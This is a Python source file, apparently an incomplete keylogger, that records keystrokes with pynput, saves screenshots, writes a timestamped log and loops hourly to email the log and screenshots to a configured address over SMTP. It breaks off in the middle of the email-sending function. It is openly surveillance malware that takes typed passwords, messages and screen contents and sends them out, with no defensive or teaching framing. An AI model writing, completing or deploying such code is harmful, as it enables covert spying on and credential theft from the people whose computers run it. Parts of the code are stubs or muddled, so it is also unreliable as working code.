from pynput import keyboard, mouse
import time
import threading
import subprocess
from PIL import ImageGrab
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

log_file = 'keystrokes_log.txt'
screenshot_folder = 'screenshots/'
email_interval = 3600  # Send email every 1 hour

current_word = ""
current_line = ""
current_application = ""
screenshot_key = keyboard.Key.print_screen

# Email configuration
smtp_server = 'your_smtp_server'
smtp_port = 587
sender_email = 'your_sender_email'
sender_password = 'your_sender_password'
recipient_email = 'recipient_email'

def on_key_press(key):
    global current_word, current_line, current_application

    try:
        if key == screenshot_key:
            capture_screenshot()
        elif hasattr(key, 'char'):
            current_word += key.char
        elif key == keyboard.Key.space:
            current_word += " "
        elif key == keyboard.Key.enter:
            current_word += "\n"
            current_line += current_word
            current_word = ""
    except AttributeError:
        if key == keyboard.Key.space:
            if current_word:
                current_line += current_word + " "
                current_word = ""
        elif key == keyboard.Key.enter:
            if current_word:
                current_line += current_word + "\n"
                current_word = ""
    
    if len(current_line) >= 50:
        save_current_line()

def save_current_line():
    global current_line
    if current_line:
        try:
            with open(log_file, 'a') as f:
                f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - Application: {current_application}\n')
                f.write(current_line)
                f.write("\n")
            current_line = ""
        except Exception as e:
            print("Error writing to file:", e)

def get_active_application():
    try:
        # Implement code here to get the active application name
        pass
    except Exception as e:
        print("Error getting active application:", e)

def capture_screenshot():
    try:
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        screenshot_path = f"{screenshot_folder}screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        print("Screenshot saved:", screenshot_path)
    except Exception as e:
        print("Error capturing screenshot:", e)

def send_email():
    while True:
        try:
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = recipient_email
            msg['Subject'] = 'Keystrokes Log and Screenshots'
            
            # Attach log file
            with open(log_file, 'rb') as f:
                log_attachment = MIMEApplication(f.read(), Name=log_file)
                log_attachment['Content-Disposition'] = f'attachment; filename="{log_file}"'
                msg.attach(log_attachment)
            
            # Attach screenshots
            for screenshot in get_screenshots():
                with open(screenshot, 'rb') as f:
                    screenshot_attachment = MIMEApplication(f.read(), Name=screenshot)
                    screenshot_attachment['Content-Disposition'] = f'attachment; filename="{screenshot}"'
                    msg.attach(screenshot_attachment)
            
            # Send email
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail
